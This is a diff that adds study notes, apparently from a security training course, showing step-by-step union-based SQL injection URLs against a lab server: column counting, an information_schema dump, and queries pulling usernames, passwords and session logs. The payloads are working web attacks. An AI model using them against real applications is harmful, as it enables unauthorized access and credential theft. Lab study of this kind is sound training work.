@@ -368,6 +368,23 @@ https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/05-sql-injection-sl
 
     http://10.50.28.178/uniondemo.php?Selection=2 OR 1=1 
     Above, you're selecting something, then adding a boolean condition to true at the end and testing each one.
+
+    Next -> use union to see how many columns are Available.
+    http://10.50.28.178/uniondemo.php?Selection=2 UNION select 1,2,3
+    
+    then "Golden statement" ->
+    http://10.50.28.178/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name FROM information_schema.columns
+
+    final to view something specific ->
+    ttp://10.50.28.178/uniondemo.php?Selection=2 UNION select studentID,username,passwd FROM session.userinfo 
+    ex 2:
+    ttp://10.50.28.178/uniondemo.php?Selection=2 UNION select session_id,user_id,remote_ip FROM session.session_log
+
+    
+    
+    
+
+    
     
     
     
